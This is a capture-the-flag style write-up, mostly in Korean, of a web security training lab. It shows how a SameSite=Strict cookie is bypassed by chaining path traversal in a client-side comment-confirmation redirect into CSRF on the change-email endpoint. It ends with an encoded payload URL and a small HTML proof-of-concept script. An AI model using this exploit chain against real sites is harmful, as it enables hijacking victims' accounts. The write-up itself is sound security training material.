# 🚩Lab: SameSite Strict bypass via client-side redirect

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials:`wiener:peter`

### 🔍 분석 및 공격 과정
1. `wiener:peter` 로 로그인.
2. 로그인시 POST하는 패킷을 프록시로 관찰 -> set-cookie로 설정되는 session쿠키의 `SameSite=strict`. -> crossorigin의 요청에 쿠키를 포함시키지 않음. -> 기존과 다른 방식이 필요함.
3. 즉 애플리케이션에 존재하는 다른 취약점을 찾아내서 동일 애플리케이션 내에서 요청을 만들어 내도록 해야함. 
4. 포스트의 커멘트란을 체크해본다.
5. 댓글을 작성하면 redirect를 하는데, 클라이언트 측 리다이렉트다. 즉, 클라이언트의 자바스크립트로 작동하는 리다이렉트. 코드는 아래와 같다.
```javascript
redirectOnConfirmation = (blogPath) => {    // <- blogPath를 파라미터로 받고
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId"); // url의 쿼리스트링의 postId 파라미터를 받아오고
        window.location = blogPath + '/' + postId; // blogPath/postId 로 합쳐 그곳으로 리다이렉팅.
    }, 3000);
}
```
6. 해당 코드를 살펴보면 알 수 있듯이 우리가 조작가능한 값인 postId가 존재한다. 만약 이 값에 경로탐색 취약점이 존재한다면, SameSite에서 발생한 요청이기에 SameSite가 strict인 세션 쿠키를 포함시키며 email변경 API로 요청을 보내는 것이 가능할 것.
7. ../이 가능한지 넣어본다.
8. `https://0aa800260438abac805f03ed00e60007.web-security-academy.net/post/comment/confirmation?postId=../`
9. `https://0aa800260438abac805f03ed00e60007.web-security-academy.net/`로 성공적으로 리다이렉트됨. -> 클라이언트 리다이렉션에 Path Traversal 취약점이 존재함.
10. 이메일 요청 API는 `/my-account/change-email`이기에 `postId=../my-account/change-email`로 주면 email변경 API로 접근가능.
11. `../my-account/change-email/?submit=1&email=a@d`이렇게 GET 방식으로 구성하고 url인코딩해본다. 뒤의 ?나 &가 잘못해석될 우려가 있기 때문이다.-> `..%2Fmy-account%2Fchange-email%2F%3Fsubmit%3D1%26email%3Da%40d`
12. 최종적으로 피해자가 접근하게 만들어야 할 url은 `https://0aa800260438abac805f03ed00e60007.web-security-academy.net/post/comment/confirmation?postId=..%2Fmy-account%2Fchange-email%2F%3Fsubmit%3D1%26email%3Da%40d` 가 되고, 최종적으로 공격서버에 배치할 CSRF PoC 스크립트를 작성한다.
```html
<body>
<script>
    location = 'https://0aa800260438abac805f03ed00e60007.web-security-academy.net/post/comment/confirmation?postId=..%2Fmy-account%2Fchange-email%2F%3Fsubmit%3D1%26email%3Da%40d';
</script>
</body>
```
                        
### 💡 취약점 원리
 커멘 작성 후 발생하는 클라이언트 측 리다이렉션에서 Path Traversal 취약점이 존재하였고 거기서 이어져 CSRF까지 확장됨.
 
